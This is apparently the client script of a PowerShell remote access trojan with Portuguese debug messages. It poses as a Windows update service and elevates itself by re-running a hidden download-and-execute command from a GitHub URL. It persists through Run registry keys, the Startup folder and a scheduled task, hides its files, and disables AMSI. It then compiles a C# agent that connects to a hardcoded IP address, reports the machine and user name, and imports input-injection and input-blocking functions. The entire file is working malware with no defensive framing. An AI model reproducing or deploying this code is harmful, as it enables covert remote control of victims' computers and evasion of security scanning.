$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
$debugLog = "C:\rat_debug.txt"

"$(Get-Date -Format 'HH:mm:ss') - [PS1] Iniciado." | Out-File $debugLog -Force

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    "$(Get-Date -Format 'HH:mm:ss') - [PS1] Solicitando Admin." | Out-File $debugLog -Append
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}
"$(Get-Date -Format 'HH:mm:ss') - [PS1] Admin OK." | Out-File $debugLog -Append

$dir = "$env:ProgramData\Microsoft\Windows\Caches"
$scriptPath = "$dir\$installName.ps1"
$vbsPath = "$dir\$installName.vbs"

if ($args -notcontains "-silent") {
    "$(Get-Date -Format 'HH:mm:ss') - [PS1] Configurando Persistencia..." | Out-File $debugLog -Append
    New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch { "$(Get-Date -Format 'HH:mm:ss') - [PS1] Erro download: $_" | Out-File $debugLog -Append }
    
    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
    Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
    
    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
    
    try {
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $startup = [Environment]::GetFolderPath('Startup')
        Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)
        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    
    attrib +h +s +r $scriptPath 2>$null
    attrib +h +s +r $vbsPath 2>$null
    
    "$(Get-Date -Format 'HH:mm:ss') - [PS1] Iniciando VBS e fechando." | Out-File $debugLog -Append
    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    exit
}

"$(Get-Date -Format 'HH:mm:ss') - [PS1] Rodando em modo SILENT. Compilando C#..." | Out-File $debugLog -Append

$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }

if (-not ("R9KAgent" -as [type])) {
    try {
        Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
        using System;
        using System.Drawing;
        using System.Drawing.Imaging;
        using System.IO;
        using System.Runtime.InteropServices;
        using System.Text;
        using System.Threading;
        using System.Net.Sockets;
        using System.Windows.Forms;
        using Microsoft.Win32;
        using System.Diagnostics;
        using System.Net;

        public class R9KAgent {
            [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
            [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
            [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
            [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();

            public static void Start(string ip, int port) {
                try { SetProcessDPIAware(); } catch {}
                File.AppendAllText(@"C:\rat_debug.txt", DateTime.Now.ToString("HH:mm:ss") + " - [C#] Tentando conectar..." + Environment.NewLine);
                
                while (true) {
                    try {
                        TcpClient myClient = new TcpClient();
                        myClient.Connect(ip, port);
                        File.AppendAllText(@"C:\rat_debug.txt", DateTime.Now.ToString("HH:mm:ss") + " - [C#] CONECTOU! Enviando BANNER..." + Environment.NewLine);
                        
                        NetworkStream myStream = myClient.GetStream();
                        StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                        StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                        myWriter.AutoFlush = true;

                        myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
                        
                        while (myClient.Connected) {
                            Thread.Sleep(1000);
                        }
                    } catch (Exception ex) {
                        File.AppendAllText(@"C:\rat_debug.txt", DateTime.Now.ToString("HH:mm:ss") + " - [C#] Erro: " + ex.Message + Environment.NewLine);
                        Thread.Sleep(3000);
                    }
                }
            }
        }
"@
        "$(Get-Date -Format 'HH:mm:ss') - [PS1] C# Compilado com Sucesso." | Out-File $debugLog -Append
    } catch {
        "$(Get-Date -Format 'HH:mm:ss') - [PS1] ERRO AO COMPILAR C#: $_" | Out-File $debugLog -Append
    }
}

"$(Get-Date -Format 'HH:mm:ss') - [PS1] Chamando [R9KAgent]::Start..." | Out-File $debugLog -Append
[R9KAgent]::Start($serverIP, $serverPort)
